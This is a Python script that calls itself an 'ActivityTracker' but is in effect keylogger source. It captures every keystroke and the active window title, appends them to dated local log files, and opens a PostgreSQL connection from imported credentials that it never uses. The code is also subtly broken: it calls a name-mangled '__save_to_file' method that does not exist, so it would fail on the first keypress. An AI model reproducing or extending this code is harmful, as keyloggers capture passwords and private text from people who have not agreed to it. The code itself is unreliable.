from pynput import keyboard
from time import gmtime, strftime
import pygetwindow as gw
import psycopg2 
import os
from DB_DATA import DBNAME, USERNAME, PASSWORD, HOST, PORT

class ActivityTracker:
    def __init__(self):
        self.last_window= None
        self.conn= self._connect_to_datbase()

    def on_press(self, key):
        active_window= gw.getActiveWindowTitle()
        if active_window != self.last_window:
            self.__save_to_file(f"Switched to: {active_window}")
            print(f"Switched to: {active_window}")
            self.last_window= active_window

        print(f"Typed: {key}")
        self.__save_to_file(f"Typed: {key}")
        if str(key) == "Key.f12":
            return False

    def _save_to_file(self, data):
        os.makedirs("logs", exist_ok= True)
        try:
            with open(f'logs/{strftime("%Y-%m-%d", gmtime())}.txt', "a", encoding= "utf-8") as file:
                file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')
        except Exception as e:
            print(f"An error occured: {e}")

    def _connect_to_datbase(self):
        try:
            conn= psycopg2.connect(
                dbname= DBNAME,
                user= USERNAME,
                password= PASSWORD,
                host= HOST,
                port= PORT
            )

            return conn
        except Exception as e:
            print(f"Could not connect to the database: {e}")




tracker= ActivityTracker()
with keyboard.Listener(
    on_press= tracker.on_press
) as listener:
    listener.join()
